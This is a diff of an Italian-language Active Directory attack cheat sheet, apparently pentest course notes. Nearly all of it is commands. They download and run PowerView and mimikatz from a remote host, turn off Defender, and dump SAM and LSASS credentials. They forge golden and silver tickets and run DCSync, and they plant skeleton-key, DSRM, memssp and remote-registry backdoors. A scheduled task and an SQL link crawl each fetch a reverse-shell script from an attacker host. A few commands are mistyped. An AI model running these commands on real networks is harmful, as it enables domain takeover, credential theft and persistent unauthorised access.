@@ -13,8 +13,11 @@
 ### Bypass Execution Policy
 ```
 powershell -ep bypass -c "command"
+
 powershell -c "command"
+
 powershell -encodedcommand
+
 $env:PSExecutionPolicyPreference="bypass"
 	
 ```
@@ -30,6 +33,7 @@ $host.ui.RawUI.WindowTitle = "Claudione"
 ### Disable Firewall
 ```
 Set-MpPreference -DisableRealtimeMonitoring $ture -Verbose
+
 Set-MpPreference -DisableIOAVprotection $true -Verbose
 ```
 
@@ -37,11 +41,13 @@ Set-MpPreference -DisableIOAVprotection $true -Verbose
 
 ```
 Get-Credentials [via RDP]
+
 Enter-PSSession -ComputerName techsrv30.tech.finance.corp -Credential tech\techservice [successivamente verrà chiesta la password]
 ```
 ### Load script on a machine
 ```
 Invoke-Command -Computername <computername> -FilePath <path>
+
 Invoke-Command -FilePath <path> $sess
 ```
 
@@ -69,60 +75,80 @@ Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( 
 - Domain/USER Enumeration
 ```
 hostname (vedo il mio name del computer nel dominio)
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-Domain"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainSID"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainPolicy"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties samaccountname,memberof"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties samaccountname,description"
+
 powershell -ep bypass -c "[System.Net.Dns]::GetHostAddresses('xor-app23')" (converte hostname in IP)
 ```
 
 - Domain Controller
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetDomainController"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetDomainController -Domain [another domain]"
 ```
 
 - GROUP Enumeration
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins'"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName "
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain admins' "
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Identity "Domain admins" -Recurse | findstr MemberName"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -UserName 'HUA10157' | findstr cn"
 ```
 
 - COMPUTER Enumeration
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetComputer | select 	samaccountname, operatingsystem"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainComputer -Ping "
 ```
 
 - Local Group in the machine 
 ```
 hostname
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLocalGroup -ComputerName PWVRTJS14.socrome.local"
 ```
 
 - Logged on the computer 
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLoggedon -ComputerName PWVRTJS14.socrome.local"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-LastLoggedOn -ComputerName PWVRTJS14.socrome.local"
 ```
 
 - SHARED INFO Enumeration
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-DomainShare -Verbose"
+
 cd \\fileshare.pentesting.local\FileShare
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-ShareFinder -Verbose"
 ```
 
 - GPO Enumeration
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetGPO"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetGPO -ComputerName PWVRTJS14.socrome.local"	
 ```
 
@@ -134,21 +160,27 @@ powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('
 - ACL (Lista di ACE (corrisponde ad un unico permesso/accesso) Due tipi: DACL(Identifica gruppi/user che hanno o accesso al servizio) e SACL(Controlla gli accessi (EDR))
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-ObjectAcl -SamAccountName HUA10157 -ResolveGUIDs"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-PathAcl -Path '\\dcorp dc.dollarcorp.moneycorp.local sysvol'"
 ```
 
 - Forest
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetForest"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetForestDomain"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetForestCatalog"
 ```
 
 - User Hunting (1: Trova tutte le macchine dove lo user ha local admin access, 2: Trova local admins su tutte le macchine del dominio, 3: Trova pc dove un domanin admin ha sessione, 4: Trova computer dove un domain admin è loggato)
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-LocalAdminAccess"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-EnumerateLocalAdmin Verbose"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-UserHunter"
+
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke.UserHunter -Stealth"
 ```
 
@@ -158,6 +190,7 @@ powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('
 https://github.com/enjoiz/Privesc
 ```
 . .\privesc.ps1
+
 Invoke-PrivEsc
 ```
 ### Beroot check all
@@ -170,17 +203,20 @@ https://github.com/AlessandroZ/BeRoot
 https://github.com/HarmJ0y/PowerUp
 ```
 . ./powerup
+
 Invoke-allchecks
 ```
 ###  Run powerup get services with unqouted paths and a space in their name
 ```
 Get-ServiceUnquoted -Verbose
+
 Get-ModifiableServiceFile -Verbose
 ```
 
 ###  Abuse service to get local admin permissions with powerup
 ```
 Invoke-ServiceAbuse
+
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
 ```
 
@@ -197,27 +233,37 @@ net user <username> <password> /add /Y   && net localgroup administrators <usern
 - Uso reg per recupero NTLM
 ```
 reg save HKLM\sam sam
+
 reg save NKLM\system system
+
 samdump2 system sam (NTLM lo piazzi dentro un file .txt)
+
 hashcat -m 1000 -a 3 hash.txt rockyou.txt
 ```
 - Con mimikatz eseguibile (mimikatz.exe)
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt
+
 impacket-psexec username:password@IP
+
 xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120
 ```
 - Con Invoke-Mimikatz
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command ' "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" '
 ```
 - Mimikatz pass the Hash
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"sekurlsa::pth" "/user:Administrator" "/domain:dollarcorp.moneycorp.local" "/ntlm:<ntlmhash>" "/run:powershell.exe"'
 ```
 o
@@ -233,23 +279,29 @@ Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
 - Ottenere hash krbtgt 
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc-corp
 ```
 o
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe '"lsadump::lsa /patch"' -Computername dc-corp
 ```
 - Usare HASH krbtgt per creare un Golden ticket per un user non autenticato . Si può usare /ticket invece che /ptt per salvare il ticket
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/krbtgt:$NTLM_HASH" "id:500" "groups:512" "/user:fakeuser" "/ptt"'
 ```
 o
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "id:500" "groups:512" "/krbtgt:$NTLM_HASH" "/user:fakeuser" "/ptt"'
 ```
 
@@ -257,6 +309,7 @@ mimikatz.exe '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "id:500" "
 
 ```
 mimikatz.exe '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
+
 Invoke-Mimikatz -Command  '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
 ```
 ## Silver Ticket [Conoscenza Hash account service. Ovviamente Local Admin nella macchina di partenza]
@@ -268,22 +321,31 @@ Invoke-Mimikatz -Command  '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
 - Servizio CIFS (Ma possono essere altri servizi come HOST). Il servizio CIFS permette di accedere al file system della vittima.
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:mgmtsrv.TECH.FINANCE.CORP" /user:Administrator /rc4:$NTLM_HASH_Service_Account /ptt'
 ```
 
 - Servizio HOST (schedule a task sul target).
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:HOST" "/target:mgmtsrv.TECH.FINANCE.CORP" /user:Administrator /rc4:$NTLM_HASH_Service_Account /ptt
 ```
 
 - Schedulare e eseguire un task dopo aver avuto un Silver ticket
 ```		
-schtasks /create /S mgmtsrv.TECH.FINANCE.CORP /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString('http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1')'"
+schtasks /create /S mgmtsrv.TECH.FINANCE.CORP /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object 
+
+Net.WebClient).DownloadString('http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1')'"
+
 schtasks /Run /S mgmtsrv.TECH.FINANCE.CORP /TN "STCheck"
+
 Import-Module powercat.ps1
+
 powercat -l -v -t 1000 -p 2023
 ```
 
@@ -292,14 +354,18 @@ powercat -l -v -t 1000 -p 2023
 ## Prerequisiti: Essere un utente del gurppo Domain Admins
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName FQDN
 ```
 o
 
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe '"privilege::debug" "misc::skeleton" "/target: FQDN_DC"'
+
 Enter-PSSession -Computername DC -credential Domain\Administrator
 ```
 
@@ -307,14 +373,18 @@ Enter-PSSession -Computername DC -credential Domain\Administrator
 
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "misc::skeleton" "!-"' -ComputerName FQDN
 ```
 o
 
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "/target: FQDN_DC" "misc::skeleton" "!-"'
+
 Enter-PSSession -Computername DC -credential Domain\Administrator
 ```
 
@@ -323,24 +393,39 @@ Enter-PSSession -Computername DC -credential Domain\Administrator
 
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dc-host-name
+
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc-host-name (comparazione Admin hash con admin hash di questo comando. Il primo è quello DSRM)
+
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior (verifichi se c'è il valore)
+
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" (se valore non esiste)
+
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2" (valore già esiste e lo cambi)
+
 Invoke-Mimikatz -Command  '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
+
 ls \\dc-host-name\C$
 ```
 o
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe '"token::elevate" "lsadump::sam" "/target: dc-host-name"'
+
 mimikatz.exe '"/target: FQDN_DC" "lsadump::lsa /patch"'
+
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior (verifichi se c'è il valore)
+
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" (se valore non esiste)
+
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2" (valore già esiste e lo cambi)
+
 mimikatz.exe '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
+
 ls \\dc-host-name\C$	
 ```
 
@@ -349,28 +434,42 @@ ls \\dc-host-name\C$
 ## Prerequisiti: Local Admin nella macchina
 ```
 Drop the mimilib.dll to system32 and add mimilib to
+
 $packages Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' select -ExpandProperty 'Security Packages'
+
 $packages += "mimilib"
+
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
 
 Using Invoke-Mimikatz
+
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command '"misc::memssp"'
+
 Tutte le info recuperate sono su C:\Windows\system32\kiwissp.log	
 ```
 o
 ```
 Drop the mimilib.dll to system32 and add mimilib to
+
 $packages Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' select -ExpandProperty 'Security Packages'
+
 $packages += "mimilib"
+
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
 
 Using mimikatz
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+
 mimikatz.exe '"misc::memssp"' (inieittare mimilib dentro lsass -> non stabile per Server 2016)
+
 Tutte le info recuperate sono su C:\Windows\system32\kiwissp.log
 ```
 
@@ -392,17 +491,60 @@ Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 ```
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
 ```
-## Add rights for DCsync 
+## ACL: Add rights for DCsync 
 ### DCSync è un attacco che consente a un avversario di simulare il comportamento di un controller di dominio (DC) e recuperare i dati della password tramite la replica del dominio. L'uso classico di DCSync è come precursore di un  attacco Golden Ticket  , in quanto può essere utilizzato per recuperare l'hash KRBTGT.
 
 ### Nello specifico, DCSync è un comando nello strumento Mimikatz open source . Utilizza i comandi nel protocollo remoto del servizio di replica directory (MS-DRSR) per simulare il comportamento di un controller di dominio e chiedere ad altri controller di dominio di replicare le informazioni, sfruttando le funzioni valide e necessarie di Active Directory che non possono essere disattivate o disattivate.
 
 ```
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
+
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+```
+## ACL: Security Descriptors
+### è possibile modificare i security descriptors (info clome Owner, primary group, DACL e SACL) di molteplifi  metodi di accesso remoto (oggetti proteggibili) per consentire l'accesso agli utenti non amministratori. Servono privilegi amministratori
+
+### SecurityDescriptor - WMI
+```
+. ./Set-RemoteWMI.ps1
+
+Set-RemoteWMI -Username <username> -Verbose (On a local machine)
+
+Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose (On a remote machine without explicit credentials)
+
+Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose (On a remote machine with explicit credentials. Only root/cimv and nested namespaces)
+
+Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose (On remote machine remove permissions)
+```
+
+### SecurityDescriptor - PowerShell Remoting
+```
+. ./Set-RemotePSRemoting.ps1
+
+Set-RemotePSRemoting -Username <username> -Verbose (On a local machine)
+
+Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose (On a remote machine without credentials)
+
+Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove (On a remote machine remove permissions)
+```
+
+### SecurityDescriptor - Remote Registry
+```
+. ./Add-RemoteRegBackdoor
+
+. ./RemoteHashRetrieval
+
+Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose (Using DAMP with admin privs on remote machine)
+
+Get-RemoteMachineAccountHash -Computername <computername> -Verbose (Retrieve machine account hash from local machine)
+
+Get-RemoteLocalAccountHash -Computername <computername> -Verbose (Retrieve local account hash from local machine)
+
+Get-RemoteCachedCredential -Computername <computername> -Verbose (Retrieve domain cached credentials from local machine)
 ```
 
 # Domain-privilege-escalation
+
 ## Contrained Delegation [Local Admin on machine]
 ### 1) Un utente, Joe, si autentica al servizio web (in esecuzione con l'account servizio studvm ) utilizzando un meccanismo di autenticazione non compatibile con Kerberos.
 ### 2) Il servizio web richiede un ticket al Key Distribution Center (KDC) per l'account di Joe.
@@ -411,13 +553,19 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ### 5) Il KDC controlla il campo msDS AllowedToDelegateTo dell'account websvc. Se il servizio è presente nell'elenco, restituirà un ticket di servizio per mgmtsrv (S4U2Proxy).
 ### 6) Il servizio Web può ora autenticarsi al CIFS su mgmtsrv come Joe utilizzando il TGS fornito.
 ## Prerequisiti: Richiesto local Admin on machine and Hash machine di partenza. Per abusare della delega vincolata nello scenario sopra descritto, è necessario avere accesso all'account studvm. Se si ha accesso a tale account, è possibile accedere ai servizi elencati in msDS AllowedToDelegateTo dell'account websvc come QUALSIASI utente.
+
 ```
-			- Get-DomainUser -TrustedToAuth
-			- Get-DomainComputer -TrustedToAuth
-			- powershell -ep bypass
-			- kekeo@ tgt::ask /user:studvm /domain:TECH.FINANCE.CORP /rc4:[HASH account servizio studvm] [step 2 e 3]
-			- .\Rubeus.exe s4u /user:studvm /rc4:[HASH account servizio studvm] /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.TECH.FINANCE.CORP /altservice:HOST /ptt [alservice= può essere fornito per sostituire uno o più nomi di servizio nel file .kirbi risultante]
-			- klist
+Get-DomainUser -TrustedToAuth
+
+Get-DomainComputer -TrustedToAuth
+
+powershell -ep bypass
+
+kekeo@ tgt::ask /user:studvm /domain:TECH.FINANCE.CORP /rc4:[HASH account servizio studvm] [step 2 e 3]
+
+.\Rubeus.exe s4u /user:studvm /rc4:[HASH account servizio studvm] /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.TECH.FINANCE.CORP /altservice:HOST /ptt [alservice= può essere fornito per sostituire uno o più nomi di servizio nel file .kirbi risultante]
+
+klist
 ```	
 
 ## Uncontrained Delegation [Local Admin on machine]
@@ -426,74 +574,90 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ## Prerequisiti: L'account ha il flag TRUSTED_FOR_DELEGATION nei flag Controllo account utente (UAC). L'account utente non ha il flag NOT_DELEGATED impostato (per impostazione predefinita gli account non di dominio hanno questo flag).
 
 ```	
-			- Get-NetComputer -Uncontrained (cercare computer che hanno il flag uncontrained attivato)
-			- powershell -ep bypass
-			- Import-Module Invoke-Mimikatz.ps1
-			- Invoke-Mimikatz -Command '"sekurlsa::tickets"' (controlla se c'è un tickets DA disponibile)
-			- Invoke-Mimikatz -Command '"kerberos:ptt [ticket.kirbi]'"
+Get-NetComputer -Uncontrained (cercare computer che hanno il flag uncontrained attivato)
+
+powershell -ep bypass
+
+Import-Module Invoke-Mimikatz.ps1
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets"' (controlla se c'è un tickets DA disponibile)
+
+Invoke-Mimikatz -Command '"kerberos:ptt [ticket.kirbi]'"
 ```
 
-## MSSQL Servers [Local Admin on machine]
+## Abuse SQL [Local Admin on machine]
 ### I server MS SQL sono generalmente distribuiti in abbondanza in un dominio Windows.
 ### I server SQL offrono ottime possibilità di spostamento laterale, in quanto gli utenti del dominio possono essere mappati su ruoli di database.
 ### Un link database consente a un server SQL di accedere a sorgenti di dati esterni come altri SQL Servers. Se presenti è possibile eseguire procedure tramite questi database link
 
 ```
-			- powershell -ep bypass
-			- Import-Module PowerupSQL.psd1
-			- Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose [Gather information]
-			- Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec master..xp_cmds hell "powershell iex(New-Object Net.WebClient).DownloadString("http://$IP_Attacker/Invoke-PowerShellTcp.ps1")"' [esecuzione commandi]
+powershell -ep bypass
+
+Import-Module PowerupSQL.psd1
+
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose [Gather information]
+
+Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec master..xp_cmds hell "powershell iex(New-Object Net.WebClient).DownloadString("http://$IP_Attacker/Invoke-PowerShellTcp.ps1")"' [esecuzione commandi]
 ```	
-
-
 
 ## Kerberoasting - AS-REPs [Normal User on the machine]
 ### Se nelle impostazioni UserAccountControl di un utente è abilitata la funzione "Non richiedere la preautenticazione Kerberos", ossia la preautenticazione Kerberos è disabilitata, è possibile ottenere l'AS REP decifrabile dell'utente e forzarlo offline.
 
 ```
-			- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -Verbose" 
-			- Invoke-ASREPRoast -Verbose (enumerazione di tutti gli utenti cpn Kerberos pre auth disabilitato)
-			- Get-ASREPHash -Username student1 -Verbose (prendere hash)
-			- ./john hash.txt --wordlist=wordlist.txt
-			- Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} (enumerazione permessi per RDPUsers su ACL PowerView)
-			
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -Verbose" 
+
+Invoke-ASREPRoast -Verbose (enumerazione di tutti gli utenti cpn Kerberos pre auth disabilitato)
+
+Get-ASREPHash -Username student1 -Verbose (prendere hash)
+
+./john hash.txt --wordlist=wordlist.txt
+
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} (enumerazione permessi per RDPUsers su ACL PowerView)			
 ```	
 
 ## Kerberoasting - Set SPN [Normal User on the machine]
 ### Con abbastanza privilegi (Generic All/Generic Write) l'SPN di un utente target può essere impostato su qualsiasi cosa (unico nel dominio). Si può richiedere TGS senza privilegi speciali
 
 ```
-			- Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} (enumerazione permessi per RDPUsers su ACL PowerView)
-			- Get-DomainUser -Identity supportuser | select serviceprincipalname (vedere se l'utente ha già un SPN)
-			- Set-DomainObject -Identity supportuser -Set @{serviceprincipalname='ops/whatever1'} (set SPN for the user)
-			- Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
-			o
-			- Request-SPNTicket (richiesta ticket)
-			- klist
-			- Invoke-Mimikatz -Command '"kerberos::list /export"' (esportare ticket)
-			- python.exe tgsrepcrack.py wordlist.txt ticket.kirbi (bruteforce password)
-			
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} (enumerazione permessi per RDPUsers su ACL PowerView)
+
+Get-DomainUser -Identity supportuser | select serviceprincipalname (vedere se l'utente ha già un SPN)
+
+Set-DomainObject -Identity supportuser -Set @{serviceprincipalname='ops/whatever1'} (set SPN for the user)
+
+Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
+o
+Request-SPNTicket (richiesta ticket)
+
+klist
+
+Invoke-Mimikatz -Command '"kerberos::list /export"' (esportare ticket)
+
+python.exe tgsrepcrack.py wordlist.txt ticket.kirbi (bruteforce password)			
 ```
 
 
-## Kerberoasting [Normal user on the machine]
+## Kerberoast [Normal user on the machine]
 ### Cracking offline delle password degli account di servizio.
 ### Gli account di servizio sono spesso ignorati (le password vengono cambiate raramente) e hanno un accesso privilegiato.
 
 ```
-			- Get-NetUser -SPN (find user accounts usati come service account)
-			- Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN(MSSQLvc/dcorp.mgmt.dollarcorp.moneycorp.local)" (Request TGS)
-			o
-			- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Request-SPNTicket" (Request TGS)
-			- klist
-			- powershell -ep bypass
-			- Import-Module Invoke-Mimikatz.ps1
-			- Invoke-Mimikatz -Command '"kerberos::list /export"' (export tickets)
-			- python.exe .\tgsrepcrack.py [passlist] [ticket.kirbi]
+Get-NetUser -SPN (find user accounts usati come service account)
+
+Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN(MSSQLvc/dcorp.mgmt.dollarcorp.moneycorp.local)" (Request TGS)
+o
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Request-SPNTicket" (Request TGS)
+
+klist
+
+powershell -ep bypass
+
+Import-Module Invoke-Mimikatz.ps1
+
+Invoke-Mimikatz -Command '"kerberos::list /export"' (export tickets)
+
+python.exe .\tgsrepcrack.py [passlist] [ticket.kirbi]
 ```	
-
-
-
 
 ## DNSAdmins
 ### E' possibile per i membri del gruppo DNSAdmins caricare DLL arbitrarie con i privilegi del dns.exe. In caso che DC serve come DNS si può fare escalation a Domain Admins. 
@@ -515,14 +679,14 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 			- net user claudione /domain
 ```
 
-## Trusting tra domini nella foresta
+## Child to Parent
